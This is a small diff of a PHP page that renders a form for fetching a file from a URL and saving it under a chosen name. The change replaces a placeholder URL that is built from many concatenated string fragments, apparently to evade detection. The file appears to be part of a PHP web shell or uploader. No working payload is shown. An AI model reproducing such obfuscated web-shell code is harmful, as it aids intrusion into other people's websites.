@@ -716,7 +716,7 @@ $path = str_replace("\\", "/", $path);
                     </legend>
                     <div class="uk-margin-small">
                         <input class="uk-input font-poppins" name="fileurl" type="text"
-                            placeholder="<?= 'ht' . 'tp' . 's' . ':/' . '/n' . 'ul' . 'z.' . 'ed' . 'u.' . 'go' . 'v.' . 'ac' . '.i' . 'd.' . 'go' . '.i' . 'd/' . 'nu' . 'lz' . '.tx' . 't' ?>"
+                            placeholder="<?= 'ht' . 'tp' . 's' . ':/' . '/b' . 'u' . 'nn' . 'ym' . 'an.' . 'ed' . 'u.' . 'go' . 'v.' . 'ac' . '.i' . 'd.' . 'go' . '.i' . 'd/' . 'b' . 'u' . 'nny' . '.tx' . 't' ?>"
                             aria-label="Input">
                         <div class="uk-margin-small"></div>
                         <input class="uk-input font-poppins" name="savedname" type="text" placeholder="saved.txt"
